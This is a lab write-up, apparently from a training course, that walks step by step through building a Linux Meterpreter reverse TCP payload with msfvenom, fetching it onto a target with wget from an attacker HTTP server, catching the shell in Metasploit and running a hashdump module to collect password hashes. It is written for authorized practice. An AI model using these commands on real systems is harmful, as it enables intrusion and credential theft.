# Meterpreter Payload Lab — MSFvenom & Metasploit

## 1. Objective

The objective of this lab is to understand how to generate a Linux Meterpreter payload using MSFvenom, establish a reverse TCP connection through Metasploit, and perform a post-exploitation task in an authorized lab environment.

## 2. Initial Access

First, we establish an SSH connection to the target machine using the credentials provided by the lab.

Once authenticated, we identify the target's system architecture by running:

```bash
uname -m
```

In this case, the output is:

```text
x86_64
```

This indicates that the target is running on an x86-64 architecture. Identifying the architecture helps us choose an appropriate payload, although compatibility also depends on the target environment and the payload's requirements.

## 3. Payload Selection and Generation

Metasploit provides a variety of payloads. We can inspect the available options using:

```bash
msfvenom -l payloads
```

We then identify a suitable Linux Meterpreter reverse TCP payload for the lab.

Before generating the payload, we must ensure that its architecture and platform are compatible with the target.

Example command:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o shell.elf
```

**Command breakdown:**

- `-p`: specifies the payload to generate.
- `LHOST`: specifies the attacker's IP address reachable from the target.
- `LPORT`: specifies the port used for the reverse connection.
- `-f elf`: specifies the output format as ELF.
- `-o shell.elf`: saves the generated payload to a file named `shell.elf`.

**Note:** The example uses a 32-bit Linux payload. The selected payload must be compatible with the target and the lab configuration; `x86_64` alone does not establish that a 32-bit payload is appropriate.

## 4. Transferring the Payload

To transfer the generated file to the target, we can start a temporary HTTP server on the attacking machine:

```bash
python3 -m http.server 9000
```

This starts an HTTP server on port `9000` by default.

On the target machine, we download the file using:

```bash
wget http://<ATTACKER_IP>:9000/shell.elf
```

Once the transfer is complete, we can stop the HTTP server with `CTRL+C`.

This method is suitable for transferring files within the authorized lab network, provided that the target can reach the attacker's HTTP server.

## 5. Configuring the Metasploit Handler

Next, we configure a handler to listen for the reverse connection initiated by the payload.

Start Metasploit:

```bash
msfconsole
```

Select the handler module:

```text
use exploit/multi/handler
```

Configure the payload and connection parameters to match those used during payload generation:

```text
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
run
```

The handler should report that it has started listening for incoming connections.

For example:

```text
[*] Started reverse TCP handler on <ATTACKER_IP>:4444
```

The handler does not exploit a vulnerability by itself. Its role is to handle an incoming connection from a compatible payload.

## 6. Executing the Payload

On the target machine, we grant the file execution permission:

```bash
chmod +x shell.elf
```

Then we execute it:

```bash
./shell.elf
```

The payload attempts to establish a reverse TCP connection to the configured listener.

If the network connectivity, payload compatibility, and handler configuration are correct, Metasploit should report that a Meterpreter session has opened.

This demonstrates the relationship between payload generation, execution, and the handler.

## 7. Backgrounding the Meterpreter Session

Once the session has opened, we can return to the Metasploit console without closing the session.

Press:

```text
CTRL+Z
```

Confirm the prompt to background the session.

Metasploit should display a message similar to:

```text
Background session 1? [y/N]
```

Enter `y` and press Enter.

The session remains available in the background, allowing us to interact with other Metasploit modules.

## 8. Post-Exploitation: Linux Hash Collection

The next step is to explore a post-exploitation module designed to collect password hashes from compatible Linux systems.

We can search for available modules using:

```text
search type:post platform:linux hashdump
```

One module that may be relevant is:

```text
post/linux/gather/hashdump
```

Select the module:

```text
use post/linux/gather/hashdump
```

We then configure the session:

```text
set SESSION 1
```

Here, `1` is an example session ID. The actual value must match the active Meterpreter session.

Finally, execute the module:

```text
run
```

The module attempts to collect password hashes from the target. Whether it succeeds depends on the system configuration, available permissions, and other environmental requirements.

Password hashes are not plaintext passwords. Their collection and interpretation are separate steps.

## 9. Key Takeaways

This lab helped me understand several important concepts:

- Identifying a target's architecture before selecting a payload.
- Generating Linux payloads with MSFvenom.
- Transferring files between machines in a controlled lab network.
- Configuring a Metasploit handler to receive a reverse connection.
- Managing Meterpreter sessions in Metasploit.
- Understanding the role and requirements of post-exploitation modules.
- Recognizing that successful execution depends on payload compatibility, network connectivity, and permissions.

## 10. Conclusion

This exercise provided practical experience with the workflow connecting MSFvenom, Metasploit handlers, Meterpreter sessions, and post-exploitation modules.

It also highlighted the importance of verifying payload compatibility, configuring connection parameters correctly, and understanding the permissions required for post-exploitation activities.

All activities were performed in an authorized lab environment.
